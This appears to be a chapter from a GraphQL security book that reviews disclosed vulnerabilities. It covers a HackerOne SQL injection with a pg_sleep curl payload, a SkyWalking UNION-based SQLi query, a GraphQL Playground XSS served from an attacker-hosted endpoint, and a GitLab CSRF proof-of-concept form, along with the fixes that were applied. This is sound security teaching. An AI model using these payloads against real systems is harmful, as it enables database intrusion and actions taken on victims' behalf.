<p class="BodyFirst">The following publicly disclosed GraphQL vulnerabilities resulted in application injection flaws. <span class="xref" itemid="xref_target_Chapter 8">Chapter 8</span> covers injections and how impactful they can be if exploited.</p>
<h3 id="h2-502840c10-0014"><a class="XrefDestination" id="SQLInjectioninaGETQueryParameter(HackerOne)"/><span class="XrefDestination" id="xref-502840c10-020"/>SQL Injection in a GET Query Parameter (HackerOne)</h3>
<p class="BodyFirst">In November 2018, Jobert identified a SQL injection in HackerOne’s GraphQL production endpoint (<a class="LinkURL" href="https://hackerone.com/reports/435066">https://hackerone.com/reports/435066</a>). Jobert had identified a nonstandard parameter passed to HackerOne’s GraphQL <em>/graphql</em> endpoint, <em>embedded_submission_form_uuid</em>, that looked like the following:</p>
<pre><code>/graphql?<b>embedded_submission_form_uuid</b>=value</code></pre>
<p><span epub:type="pagebreak" id="Page_263" title="263"/>This URL parameter isn’t standard in GraphQL APIs, where you are more likely to see parameters such as the following:</p>
<ol class="none">
<li><code>query</code></li>
<li><code>variables</code></li>
<li><code>operationName</code></li>
</ol>
<p>You should already be familiar with these: <code>query</code> takes the full GraphQL query as its value, <code>variables</code> takes additional data passed to the query (variables such as argument values), and <code>operationName</code> is the name of the operation. Jobert was able to identify that the value passed to the custom parameter wasn’t checked on the backend, effectively allowing them to inject SQL commands.</p>
<p>The HackerOne triage team shared the Ruby code responsible for processing the GraphQL parameters, and we’ve modified it here to make the problem more apparent:</p>
<pre><code>unless database_parameters_up_to_date
  safe_query = ''

<span aria-label="annotation1" class="CodeAnnotationCode">❶</span> new_parameters = {"embedded_submission_form_uuid":"PAYLOAD"}

  new_parameters.each <span aria-label="annotation2" class="CodeAnnotationCode">❷</span> do |key, value|
      safe_query += "SET SESSION #{key} TO #{value};"
  end

  begin
      # safe_query ="SET SESSION embedded_submission_form_uuid TO PAYLOAD"
      connection.query(safe_query)
  rescue ActiveRecord::StatementInvalid =&gt; e
      raise e unless e.cause.is_a? PG::InFailedSqlTransaction
  end

end</code></pre>
<p>The <code>new_parameters</code> variable <span aria-label="annotation1" class="CodeAnnotation">❶</span> is a hash map containing the custom <code>embedded_submission_form_uuid</code> URL parameter and its value (which is client controlled). At <span aria-label="annotation2" class="CodeAnnotation">❷</span>, a loop performs string interpolation on the keys and values assigned to the variable, effectively composing a string with the parameter and its value together. It combines this string with the <code>SET</code> <code>SESSION</code> SQL command.</p>
<p>The new SQL command is eventually assigned to the <code>safe_query</code> variable, which, at this point, the attacker controls without any checks. We’ve used a comment to highlight the value that gets assigned to the variable: the GET parameter <code>embedded_submission_form_uuid</code> key and its value. The variable eventually gets translated to a SQL query and executed. GraphQL parameters aren’t automatically sanitized either, which contributes to the SQL injection condition.</p>
<p><span epub:type="pagebreak" id="Page_264" title="264"/>Jobert crafted a special cURL request to verify the injection:</p>
<pre><code>time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=
1%27%3BSELECT%201%3BSELECT%20<b>pg_sleep</b>\(<b>10</b>\)%3B--%27

0.02s user 0.01s system 0% cpu <b>10</b>.557 total</code></pre>
<p>The URL-decoded version of this cURL request looks like this:</p>
<pre><code>/graphql?embedded_submission_form_uuid=<b>1';SELECT 1;SELECT pg_sleep\(10\);--'</b></code></pre>
<p>This request used a time-based SQL injection technique (covered in <span class="xref" itemid="xref_target_Chapter 8">Chapter 8</span>) to introduce a time delay of <code>10</code> seconds in the server’s processing by using the PostgreSQL command <code>pg_sleep</code>. The attacker then tracked the time it took the server to respond to the request by using the Linux <code>time</code> command. It took 10.557 seconds to complete.</p>
<p>This technique not only confirmed the existence of the vulnerability but also avoided accidentally disclosing sensitive information or potentially sending dangerous commands to the database that could cause data to be lost.</p>
<h3 id="h2-502840c10-0015"><a class="XrefDestination" id="SQLInjectioninanObjectArgument(ApacheSkyWalking)"/><span class="XrefDestination" id="xref-502840c10-021"/>SQL Injection in an Object Argument (Apache SkyWalking)</h3>
<p class="BodyFirst">Apache SkyWalking is a performance-monitoring platform for microservices and cloud-native architectures created by the Apache Software Foundation. In June 2020, it suffered from a SQL injection vulnerability introduced through a value passed to a GraphQL field argument. This vulnerability was assigned the identifier CVE-2020-9483.</p>
<p>SkyWalking can work with various storage backends, such as H2, OpenSearch, PostgreSQL, and TiDB. A hacker who goes by the handle Jumbo-WJB discovered that when SkyWalking was used in conjunction with either H2 or MySQL storage backends, it was vulnerable to a SQLi through the <code>getLinearIntValues</code> field <code>metric</code> argument.</p>
<p>Jumbo-WJB published an exploit for this vulnerability, constructing a special payload in the GraphQL query that abused the bug to achieve a SQLi. In the following example query, you can see that the value of <code>id</code>, which is passed as input to the <code>metric</code> argument, contains SQL query syntax:</p>
<pre><code>query SQLi($d: Duration!) {
  getLinearIntValues(metric:
{name: "all_p99", id: "<b>') UNION SELECT 1,CONCAT('~','9999999999','~')--</b>"},
duration: $d) {
    values {
      value
    }
  }
}</code></pre>
<p>For a value, the <code>metric</code> argument expects an object that includes keys such as <code>id</code> and <code>name</code>. The vulnerability appeared to be in the <code>id</code> key, which doesn’t get sanitized before it is inserted into either H2 or MySQL databases.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<span epub:type="pagebreak" id="Page_265" title="265"/><h2><span class="NoteHead">NOTE</span></h2>
<p>	The full exploit to this vulnerability can be found in the Nuclei vulnerability scanner project’s public repository at <a class="LinkURL" href="https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-9483.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-9483.yaml</a>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>By examining the pull request on SkyWalking’s GitHub repository containing the fix, we can get an idea of what the vulnerable code area might have looked like (<a href="#figure10-5" id="figureanchor10-5">Figure 10-5</a>).</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c10/f10005.png"/>
<figcaption><p><a id="figure10-5">Figure 10-5</a>: Apache SkyWalking’s vulnerable code</p></figcaption>
</figure>
<p>The <code>getLinearIntValues</code> method takes a few arguments, such as <code>tableName</code>, <code>valueCName</code>, and <code>ids</code> (line 110), and does some string building using Java’s <code>StringBuilder</code> (line 112). A loop is then used to iterate through the values passed to the <code>ids</code> argument and construct a string by concatenating them and decorating them using single quotes (lines 113 to 118). The newly built string eventually gets used as part of a SQL query without sanitization (lines 123 to 125).</p>
<p>It is very possible that the <code>metric</code> object’s <code>id</code> GraphQL argument is inserted directly into the <code>ids</code> list and therefore allows injecting SQL commands.</p>
<h3 id="h2-502840c10-0016"><a class="XrefDestination" id="Cross-SiteScripting(GraphQLPlayground)"/><span class="XrefDestination" id="xref-502840c10-022"/>Cross-Site Scripting (GraphQL Playground)</h3>
<p class="BodyFirst">CVE-2021-41249 is a reflected XSS vulnerability impacting the GraphQL Playground IDE, which provides an interface for sending queries to the API, as well as raw schema information, documentation about the API’s features, and information taken from inline SDL code comments. This information is partially populated by an introspection query that gets sent automatically when GraphQL Playground loads. Other information might come from the GraphQL server.</p>
<p>This vulnerability is quite different from those covered so far in this chapter. First, it impacts the API consumer directly, as a successful <span epub:type="pagebreak" id="Page_266" title="266"/>exploitation would execute in their browser. Second, attackers could exploit it in two ways:</p>
<ul class="disc">
<li>By compromising a GraphQL server and modifying its schema to include dangerous characters.</li>
<li>By building a custom GraphQL server with a malicious payload implemented. The attacker could then target the client by sending them a link to load the GraphQL Playground with the malicious server’s address—for example, <em>http://blackhatgraphql.com/graphql?endpoint=http://attacker.com/graphql?query={__typename}</em>. If the victim clicks the link, their browser will automatically load the malicious API and run a query on their behalf, which executes the payload into the Playground running in their browser and triggers the XSS.</li>
</ul>
<p>Let’s explore how a GraphQL server could serve such malicious payloads. Consider the following code sample from DVGA:</p>
<pre><code>class <b>UserObject</b>(SQLAlchemyObjectType):
  class Meta:
    <b>name = "MyMaliciousTypeName"</b>
    model = User</code></pre>
<p>This code represents DVGA’s <code>UserObject</code> object. Developers could use the <code>name</code> variable to rename an object’s name to a custom string, and a threat actor could do the same if they’ve compromised the server (or simply hosted their own version of it). This name will then get rendered in an IDE tool’s documentation section (<a href="#figure10-6" id="figureanchor10-6">Figure 10-6</a>).</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c10/f10006.png"/>
<figcaption><p><a id="figure10-6">Figure 10-6</a>: A malicious type name shown in a search</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_267" title="267"/>When a client opens the GraphQL Playground to query the API, the malicious JavaScript payload will be rendered in their browser, which, in this case, is injected into a type’s name.</p>
<p>This exact vulnerability existed in the Playground Node Package Manager (npm) package <em>graphql-playground-react</em>. In late 2021, the library maintainers took the following steps to remediate the vulnerability:</p>
<ul class="disc">
<li>Ensuring that any HTML text is escaped</li>
<li>Ensuring that type names conform to the GraphQL specification</li>
<li>Avoiding loading the documentation section if it contains dangerous characters</li>
<li>Ensuring that user-generated HTML is checked and made safe</li>
</ul>
<p>GraphQL IDEs are popular, so if you’re performing a penetration test and identify an old version of GraphQL Playground, it’s possible that it hasn’t been patched and is still vulnerable to this XSS. Alternatively, you could host your own malicious GraphQL server containing the vulnerable Playground library and trick a victim into visiting it.</p>
<h2 id="h1-502840c10-0005"><a class="XrefDestination" id="Cross-SiteRequestForgery(GitLab)"/><span class="XrefDestination" id="xref-502840c10-023"/>Cross-Site Request Forgery (GitLab)</h2>
<p class="BodyFirst">Earlier in the book, we highlighted techniques for identifying GraphQL APIs that allow GET-based queries. Let’s now see how a hacker was able to abuse this functionality. In March 2021, the hacker az3z3l disclosed a CSRF vulnerability to GitLab (<a class="LinkURL" href="https://hackerone.com/reports/1122408">https://hackerone.com/reports/1122408</a>).</p>
<p>When handling GraphQL queries over the POST method, GitLab uses a special <code>X-CSRF-Token</code> HTTP header to protect against CSRF attacks. This header includes a unique token in each request or query.</p>
<p>GET requests aren’t typically used for actions such as data modifications, so companies don’t usually protect them with anti-CSRF tokens. But because GitLab supported queries using GET, the CSRF protection in place did not apply to those queries, even though these operations included queries and mutations and had the ability to perform changes through the API.</p>
<p>Ethical hacker az3z3l provided proof-of-concept HTML code that abuses the CSRF vulnerability:</p>
<pre><code><var>--snip--</var>
&lt;form action="https://gitlab.com/api/graphql/" id="csrf-form" method="GET"&gt; <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>
&lt;input name= <span aria-label="annotation2" class="CodeAnnotationCode">❷</span> "query" value="mutation CreateSnippet($input: CreateSnippetInput!) <var>--snip--</var>"&gt;
&lt;input name= <span aria-label="annotation3" class="CodeAnnotationCode">❸</span> "variables" value='{"input":{"title":"Tesssst Snippet"} <var>--snip--</var>'&gt;
&lt;/form&gt;
<var>--snip--</var>
&lt;script&gt;document.getElementById("csrf-form").submit()&lt;/script&gt; <span aria-label="annotation4" class="CodeAnnotationCode">❹</span></code></pre>
<p>This HTML code defines a submission form <span aria-label="annotation1" class="CodeAnnotation">❶</span> that includes two inputs: <code>query</code> <span aria-label="annotation2" class="CodeAnnotation">❷</span>, which specifies the use of a mutation named <code>CreateSnippet</code>, and <code>variables</code> <span aria-label="annotation3" class="CodeAnnotation">❸</span>, which holds a few variables passed via the input type. At <span aria-label="annotation4" class="CodeAnnotation">❹</span>, the code uses JavaScript to submit the form on behalf of the client as soon as a <span epub:type="pagebreak" id="Page_268" title="268"/>client loads an HTML page that contains it. Because the API doesn’t check for a CSRF protection header, this is possible.</p>
<p>The GraphQL mutation used in the exploit is as follows:</p>
<pre><code>mutation CreateSnippet($input: CreateSnippetInput!) {
  createSnippet(input: $input) {
    errors
    snippet {
      webUrl
      __typename
    }
<var>    --snip--</var>
  }
}</code></pre>
<p>As a result of this query, a snippet will be created on behalf of the client with whatever data the attacker included in the HTML form. This CSRF could let the attacker take sensitive actions on behalf of the victim, such as accessing their account or data.</p>
<h2 id="h1-502840c10-0006"><a class="XrefDestination" id="Summary"/><span class="XrefDestination" id="xref-502840c10-024"/>Summary</h2>
<p class="BodyFirst">This chapter covered public disclosures of real-life vulnerabilities and exploits. You learned about how certain design choices in GraphQL implementations created vulnerabilities that led to information disclosure, injections, authorization issues, and more. We also discussed some of the mitigation approaches companies took to patch the vulnerabilities, where possible.</p>
<p>This book introduced you to GraphQL’s new ways of querying APIs. As you’ve learned, the framework has its own rules, advantages, and disadvantages. GraphQL’s design introduces new vulnerabilities and security challenges. Simultaneously, it remains prone to the classic vulnerabilities that have existed for years. Now that you know how to find vulnerabilities in GraphQL, we recommend that you try to poke holes in the GraphQL applications made available through vulnerability disclosure programs. Who knows; maybe you’ll make a buck or two.</p>
</section>
</body>
</html>